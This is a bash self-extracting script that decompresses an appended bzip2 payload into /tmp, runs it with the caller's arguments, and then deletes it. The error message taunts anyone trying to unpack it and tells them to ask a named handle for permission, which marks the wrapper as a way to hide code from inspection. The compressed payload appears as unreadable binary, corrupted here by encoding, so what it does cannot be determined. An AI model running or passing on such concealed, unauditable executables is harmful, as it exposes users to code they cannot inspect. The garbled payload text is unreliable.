#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYLA+j �_�qs���?�������PD@  `>} �@(
 P A��M4����F@ & 48i��CCC#@2 ��h� ���M4�hhhdh@M  0����i��� �C@i�  �@&�4<���	���O4�=��<OS�PQS�S�OR~��C�G�hQ�d4�  �T?��7OO�������"�I�+b��D��?��x�L���>,�g�yInp�}�3�v�?�n<$ a�a�m-������G"T���������6���!����&N60É� d��o��$�aS��9�
�oS�fP�%OY�Q���8���A�}H-���q�a����༏a�r58���$�oK����kq4&�<I�>���hhk-Wu��`q�Ά]-n'�������М�hdt����V���ZFF� zm t�9Jt6!.V��9]DnyC�0�����u�{s�o{����i����(pv4ƆӍ�})
�12	�$��jJ�d;�z��j~��ICn�n��{(�����}nF�=l8'(�P����0��JQ�N�O+'�C��ֻ-�ԓS�«�!T !C�9��9�+��ʆ��¾¡��l-AS�:�/��Q�Hjia���R |�l����m�4�hI���OXK��M�Y,k
:C����W��a��^#��'�ou��9���C�/��>/��A}�����}l��<�'���"s��H��j���4���7�lB�������K�Na���RM���l�����`D�B��d?�X�K�)���C��`Y9����nF��үm�ݖ�m�
^��e�Z��N� �{�����h|��s	�CK3��&�2Hs0��(�;##Y�)�q���`jO��ۭ����&�s�a��� B������H�!�\��G #�}���C��f8�0!&�ds�7+c@��kr-��r�i�L�+O31���Hj��0����|46�T+�t�oC��p!(]L�K'}��4��X�=p�i_ajL|΀W�@��kB��jlZ�ί���pQ(B@y��0�m�ڌ�; �r=��kx�\�
e-7]���C��ᥐ��d�[ �<HV��u0:�����?�Pwښޖ��l���kK&Nv��8�y����'��w����;������s��d��Ch��[[�z�����ηtxKڄ/&�������w����a��5�C�Ay\C�r���|CJt����4�}�ѓ�ڷ�7Y����5�.�[c��$��!��	���Ҕ�� ������ɐeAe+8�� �Vo:����sP�4	ly�'1kRCC'�+N"�`�JI�j}ö:���a���47�04�d���Ss4!���V����U�Z�N�ۆJ8�Q�$j	��Y4A0;�S�^.q�F�Ĳ���4��V� kdH$̃�`��d���D���;�s��nn��=��(l��V�M��<m��Mc�����@����6�2�ySSPH4�t�-@3d��b�@�����q�q.�eR�jW��q���a6mc4#��x\��|CS�p���Ђ�p��7���+{�hs&w%�r����TP!�8��Sc�
�02#�oz#�`�olCa�e�9� ѹ󹆃@ B�B�.�p� ��V�